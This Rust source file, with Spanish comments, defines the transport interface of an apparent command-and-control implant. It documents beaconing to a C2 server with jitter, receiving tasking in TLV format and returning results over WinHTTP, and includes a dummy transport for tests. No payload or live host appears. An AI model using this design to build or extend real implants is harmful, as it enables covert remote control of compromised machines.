//! # Abstracción de Transporte
//!
//! Este módulo define el trait `Transport` que abstrae la comunicación entre
//! el agente y el servidor C2. Esto permite diferentes implementaciones de
//! transporte (HTTP, DNS, TCP, etc.) sin modificar la lógica del agente.
//!
//! ## Arquitectura
//!
//! ```text
//! +----------------+     +----------------+     +----------------+
//! |   Runtime      | --> |   Transport    | --> |   C2 Server    |
//! |   (run_loop)   |     |   (trait)      |     |                |
//! +----------------+     +----------------+     +----------------+
//!                              |
//!                              v
//!                     +----------------+
//!                     | WinHttpTransport|
//!                     | (implementación)|
//!                     +----------------+
//! ```
//!
//! ## Trait Transport
//!
//! El trait define tres operaciones fundamentales:
//!
//! | Método | Descripción |
//! |--------|-------------|
//! | `connect` | Establece conexión con el C2 |
//! | `checkin` | Envía beacon y recibe comandos |
//! | `send_result` | Envía resultados de comandos |
//!
//! ## Implementaciones
//!
//! - `WinHttpTransport`: HTTP/HTTPS usando WinHTTP API de Windows
//! - `DummyTransport`: Transporte de prueba para unit tests

/// Errores posibles en operaciones de transporte.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum TransportError {
    /// Funcionalidad no implementada en este transporte.
    Unimplemented,
    
    /// Error de I/O (conexión fallida, timeout, etc.).
    Io(String),
    
    /// Error de protocolo (respuesta inválida, etc.).
    Protocol(String),
    
    /// Configuración inválida (URL malformada, etc.).
    InvalidConfig(String),
}

/// Trait que define la interfaz de comunicación con el C2.
///
/// ## Ciclo de Vida Típico
///
/// ```text
/// 1. connect() -> Ok(())
/// 2. loop {
///        checkin(request) -> Ok(response)
///        // procesar response
///        send_result(data) -> Ok(())
///        // sleep con jitter
///    }
/// ```
///
/// ## Implementación
///
/// Para implementar un nuevo transporte:
///
/// ```rust
/// struct MyTransport {
///     // campos específicos
/// }
///
/// impl Transport for MyTransport {
///     fn type_name(&self) -> &'static str { "my_transport" }
///     fn connect(&mut self) -> Result<(), TransportError> { /* ... */ }
///     fn checkin(&mut self, request: &[u8]) -> Result<Vec<u8>, TransportError> { /* ... */ }
///     fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError> { /* ... */ }
/// }
/// ```
pub trait Transport {
    /// Retorna el nombre del tipo de transporte.
    ///
    /// Útil para logging y debugging.
    fn type_name(&self) -> &'static str;
    
    /// Establece conexión con el servidor C2.
    ///
    /// Este método debe llamarse antes de `checkin` o `send_result`.
    /// En implementaciones HTTP, típicamente:
    /// - Inicializa la sesión (WinHttpOpen)
    /// - Conecta al servidor (WinHttpConnect)
    ///
    /// ## Retorna
    ///
    /// - `Ok(())`: Conexión establecida
    /// - `Err(TransportError::Io)`: Error de conexión
    fn connect(&mut self) -> Result<(), TransportError>;
    
    /// Envía un beacon/checkin y recibe comandos del C2.
    ///
    /// ## Argumentos
    ///
    /// - `request`: Datos opcionales a enviar (puede ser vacío)
    ///
    /// ## Retorna
    ///
    /// - `Ok(Vec<u8>)`: Datos recibidos del C2 (comandos en formato TLV)
    /// - `Err(TransportError::Io)`: Error de comunicación
    ///
    /// ## Comportamiento
    ///
    /// - Si `request` está vacío: típicamente GET request
    /// - Si `request` tiene datos: típicamente POST request
    fn checkin(&mut self, request: &[u8]) -> Result<Vec<u8>, TransportError>;
    
    /// Envía resultados de comandos al C2.
    ///
    /// ## Argumentos
    ///
    /// - `data`: Resultados en formato TLV serializado
    ///
    /// ## Retorna
    ///
    /// - `Ok(())`: Datos enviados exitosamente
    /// - `Err(TransportError::Io)`: Error de comunicación
    fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError>;
}

#[cfg(test)]
mod tests {
    use super::*;

    struct DummyTransport {
        pub last_sent: Vec<u8>,
        pub next_recv: Vec<u8>,
        pub connected: bool,
    }

    impl DummyTransport {
        fn new(next_recv: Vec<u8>) -> Self {
            Self {
                last_sent: Vec::new(),
                next_recv,
                connected: false,
            }
        }
    }

    impl Transport for DummyTransport {
        fn type_name(&self) -> &'static str {
            "dummy"
        }

        fn connect(&mut self) -> Result<(), TransportError> {
            self.connected = true;
            Ok(())
        }

        fn checkin(&mut self, _request: &[u8]) -> Result<Vec<u8>, TransportError> {
            Ok(std::mem::take(&mut self.next_recv))
        }

        fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError> {
            self.last_sent = data.to_vec();
            Ok(())
        }
    }

    #[test]
    fn dummy_transport_roundtrip() {
        let mut t = DummyTransport::new(vec![1, 2, 3]);
        t.connect().unwrap();
        assert!(t.connected);
        let r = t.checkin(&[]).unwrap();
        assert_eq!(r, vec![1, 2, 3]);
        t.send_result(b"ok").unwrap();
        assert_eq!(t.last_sent, b"ok");
    }
}
